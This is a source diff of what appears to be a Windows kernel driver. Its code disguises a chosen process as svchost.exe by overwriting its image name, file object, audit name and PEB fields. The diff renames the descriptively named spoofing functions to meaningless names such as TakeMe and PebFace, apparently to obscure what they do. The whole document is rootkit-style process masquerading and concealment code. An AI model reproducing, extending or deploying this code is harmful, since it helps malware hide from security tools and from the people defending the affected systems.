@@ -141,7 +141,7 @@ LARGE_INTEGER g_TarCreateTime = { 0 };
 ULONG_PTR g_TarInheritedFromUniqueProcessId = 0;
 
 NTSTATUS 
-PsGetTarProcessInfo(HANDLE pid)
+prcc_Info(HANDLE pid)
 {
     PPEB peb = NULL;
     PLDR_DATA_TABLE_ENTRY ldr = NULL;
@@ -301,7 +301,7 @@ PathWin10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName)
     return bRet;
 }
 
-BOOLEAN PathSeFileObject(PEPROCESS Process, WCHAR* szFullName)
+BOOLEAN TakeMe(PEPROCESS Process, WCHAR* szFullName)
 {
     BOOLEAN bRet = FALSE;
     PFILE_OBJECT pFileObject = NULL;
@@ -340,7 +340,7 @@ BOOLEAN PathSeFileObject(PEPROCESS Process, WCHAR* szFullName)
     return bRet;
 }
 
-BOOLEAN PathPebLdr(PEPROCESS Process, WCHAR* szFullName, WCHAR* szBaseName)
+BOOLEAN PebHouse(PEPROCESS Process, WCHAR* szFullName, WCHAR* szBaseName)
 {
     PPEB peb = NULL;
     BOOLEAN bRet = FALSE;
@@ -392,7 +392,7 @@ BOOLEAN PathPebLdr(PEPROCESS Process, WCHAR* szFullName, WCHAR* szBaseName)
 }
 
 BOOLEAN 
-PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName)
+PebFace(PEPROCESS Process, WCHAR* szFullName)
 {
     BOOLEAN bRet = FALSE;
     BOOLEAN bAttach = FALSE;
@@ -453,7 +453,7 @@ PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName)
     return bRet;
 }
 
-BOOLEAN PathSeAuditProcessCreationInfo(PEPROCESS Process, WCHAR* ProcessName)
+BOOLEAN PairToPair(PEPROCESS Process, WCHAR* ProcessName)
 {
     PUNICODE_STRING Name = NULL;
     PUNICODE_STRING SelocateName = NULL;
@@ -486,7 +486,7 @@ BOOLEAN PathSeAuditProcessCreationInfo(PEPROCESS Process, WCHAR* ProcessName)
 }
 
 BOOLEAN 
-PathImageFileName(PEPROCESS Process, char* cName)
+MyFace(PEPROCESS Process, char* cName)
 {
     char    szNameBuff[15] = { 0 };
     char*   szProcessBuff = NULL;
@@ -594,24 +594,24 @@ Transing(HANDLE pid)
     if (SvchostPid == NULL)
         return FALSE;
 
-    if (!NT_SUCCESS(PsGetTarProcessInfo(SvchostPid)))
+    if (!NT_SUCCESS(prcc_Info(SvchostPid)))
         return FALSE;
 
     if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &Process)))
         return FALSE;
 
-    PathSeFileObject(Process, g_szTarFileObjectName);
+    TakeMe(Process, g_szTarFileObjectName);
 
     if (*NtBuildNumber > 9600)
         PathWin10ImageNamePoint(Process, g_szTarWin10ImageFilePointerName);
 
-    PathImageFileName(Process, "svchost.exe");
+    MyFace(Process, "svchost.exe");
 
-    PathSeAuditProcessCreationInfo(Process, g_szTarSeAuditProcessName);
+    PairToPair(Process, g_szTarSeAuditProcessName);
 
-    PathPebProcessParameters(Process, g_szTarPebFullName);
+    PebFace(Process, g_szTarPebFullName);
 
-    PathPebLdr(Process, g_szTarPebFullName, g_szTarPebBaseName);
+    PebHouse(Process, g_szTarPebFullName, g_szTarPebBaseName);
 
     //PathToken(Process);
 
